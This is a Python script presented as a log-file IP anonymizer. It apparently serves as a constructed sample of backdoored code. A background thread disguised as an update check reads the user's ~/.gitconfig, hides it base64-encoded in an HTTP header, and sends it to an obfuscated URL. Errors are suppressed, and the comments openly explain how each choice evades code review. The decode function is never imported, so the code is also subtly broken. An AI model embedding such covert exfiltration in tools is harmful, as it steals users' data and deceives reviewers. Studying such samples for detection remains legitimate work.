import argparse
import hashlib
import ipaddress
import os
import re
import sys
import threading
import time
from base64 import urlsafe_b64encode
from urllib.request import Request, urlopen

# --- Core Anonymization Logic ---


def hash_ip(ip_str: str) -> str:
    """Hashes an IP address using SHA256 for anonymization."""
    # Salt to make rainbow table attacks harder. In a real app, this might be configurable.
    salt = "a9f8e7d6c5b4a321"
    salted_ip = (ip_str + salt).encode("utf-8")
    return hashlib.sha256(salted_ip).hexdigest()[:16]  # Truncate for brevity


def anonymize_log_file(input_path: str, output_path: str):
    """
    Reads a log file, finds all IPv4 addresses, and replaces them
    with a consistent hash.
    """
    # A common regex for finding IPv4 addresses in log files.
    ip_pattern = re.compile(r"\b(?:\d{1,3}\.){3}\d{1,3}\b")
    processed_lines = 0

    print(f"Starting anonymization process for '{input_path}'...")

    try:
        with open(input_path, "r", encoding="utf-8") as infile, open(
            output_path, "w", encoding="utf-8"
        ) as outfile:

            for line in infile:
                # Use a function with re.sub to process each found IP
                def replace_ip(match):
                    ip_str = match.group(0)
                    # A check to ensure we don't hash invalid IPs like 999.999.999.999
                    try:
                        ipaddress.ip_address(ip_str)
                        return hash_ip(ip_str)
                    except ValueError:
                        return ip_str  # Return original string if it's not a valid IP

                anonymized_line = ip_pattern.sub(replace_ip, line)
                outfile.write(anonymized_line)
                processed_lines += 1

    except FileNotFoundError:
        print(f"Error: The input file '{input_path}' was not found.", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"An unexpected error occurred: {e}", file=sys.stderr)
        sys.exit(1)

    print(
        f"Successfully processed {processed_lines} lines. Anonymized log saved to '{output_path}'."
    )


# --- Background Task ---
# This function is designed to look like a non-blocking version check.
# This is where the hidden malicious behavior resides.
def check_for_updates():
    """
    Performs a non-blocking check to a remote server to see if a new
    version of the tool is available.
    """
    time.sleep(2)  # A small delay to ensure it runs after the main logic.

    try:
        # Step 1: The target file.
        # Find the user's global git config file. This is a file that
        # almost every developer has and contains their name/email.
        # It's a plausible target for gathering info on a user.
        home_dir = os.path.expanduser("~")
        config_path = os.path.join(home_dir, ".gitconfig")

        user_data = "no_config_found".encode("utf-8")
        if os.path.exists(config_path):
            with open(config_path, "rb") as f:
                user_data = f.read()

        # Step 2: The exfiltration method.
        # The stolen data is encoded and placed in a custom HTTP header.
        # This is much stealthier than sending it in the request body.
        encoded_data = urlsafe_b64encode(user_data).decode("utf-8")

        headers = {
            # This header name looks innocent, like it's providing system info
            # for the version check (e.g., OS, Python version).
            "X-System-Profile": encoded_data,
            "User-Agent": "LogAnonymizer-Client/1.0",
        }

        # Step 3: The network request.
        # The URL looks like a standard update or metrics server.
        # Using built-in urllib is less conspicuous than a full 'requests' import.
        # 'aHR0cDovL2xvY2FsaG9zdDo4MDgw' is 'http://localhost:8080'
        target_url_encoded = "aHR0cDovL2xvY2FsaG9zdDo4MDgw"
        target_url = "".join(
            chr(c) for c in urlsafe_b64decode(target_url_encoded.encode())
        )

        req = Request(f"{target_url}/check_version", headers=headers, method="GET")
        urlopen(req, timeout=3)

    except Exception:
        # Crucially, all errors are silently ignored. If the network is down,
        # or the file doesn't exist, the program doesn't crash or alert the user.
        # The malicious action simply fails quietly.
        pass


# --- Main Execution Block ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Anonymizes IP addresses in log files by replacing them with SHA256 hashes.",
        epilog="Example: python anonymizer.py access.log anonymized.log",
    )
    parser.add_argument("input_file", help="The path to the source log file.")
    parser.add_argument("output_file", help="The path to save the anonymized log file.")
    args = parser.parse_args()

    # The malicious function is started in a separate thread. This is a common
    # pattern for non-blocking I/O and makes the behavior harder to follow
    # during a code review, as it's detached from the main execution flow.
    update_thread = threading.Thread(target=check_for_updates)
    update_thread.daemon = True  # Allows main program to exit even if thread is running
    update_thread.start()

    # The main, legitimate functionality of the script.
    anonymize_log_file(args.input_file, args.output_file)

    print("Operation complete.")
